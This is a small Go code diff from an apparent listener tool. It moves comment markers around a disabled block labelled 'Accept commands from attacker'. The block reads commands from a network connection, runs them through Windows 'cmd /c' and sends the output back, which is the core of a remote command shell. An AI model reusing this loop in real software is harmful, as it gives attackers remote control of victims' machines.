@@ -141,15 +141,16 @@ func createNewListener() { //function to construct our listener
 	println("Connection IP and Port are: " + ipAndPortString)
 	//println("Listener successfully started")
 
-	//Accept commands from attacker
-	/*for {
-		attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
-		cmd := exec.Command("cmd", "/c", attackerCommands)
-		if err != nil {
-			log.Fatalln(err)
-		}
-		out, _ := cmd.CombinedOutput()
+	/*
+		//Accept commands from attacker
+		for {
+			attackerCommands, _ := bufio.NewReader(connection).ReadString('\n')
+			cmd := exec.Command("cmd", "/c", attackerCommands)
+			if err != nil {
+				log.Fatalln(err)
+			}
+			out, _ := cmd.CombinedOutput()
 
-		connection.Write(out)
-	}*/
+			connection.Write(out)
+		} */
 }
